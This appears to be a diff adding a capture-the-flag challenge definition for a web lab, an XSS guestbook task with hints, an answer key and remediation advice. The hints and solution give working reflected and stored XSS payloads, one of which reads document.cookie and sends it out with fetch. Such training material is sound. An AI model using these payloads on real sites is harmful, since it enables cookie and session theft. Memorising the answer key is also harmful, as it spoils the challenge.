@@ -1,0 +1,26 @@
+id: xss-guestbook
+title: Cross-Site Scripting Guestbook
+category: web
+difficulty: easy
+order: 20
+description: >-
+  A guestbook stores messages and echoes search terms without escaping. The flag
+  is in a cookie that JavaScript can read. Get script execution and exfiltrate it.
+image: cyberlab/challenge-xss-guestbook:latest
+container_port: 8000
+ttl_minutes: 30
+points: 100
+hints:
+  - The search box reflects your input raw. Try <script>alert(1)</script>.
+  - The guestbook stores HTML. A stored payload runs for every visitor.
+  - Read the flag with document.cookie, then submit it on the challenge page.
+solution: |
+  1. Reflected: visit
+       /guestbook?q=<script>alert(document.cookie)</script>
+  2. Stored: post a message with body
+       <script>fetch('/?leak='+encodeURIComponent(document.cookie))</script>
+     and reload the page.
+  3. The cookie lab_flag contains the flag.
+
+  Fix: context-aware output encoding, a Content-Security-Policy, and set cookies
+  with HttpOnly + Secure + SameSite=Lax. Treat all user input as untrusted.
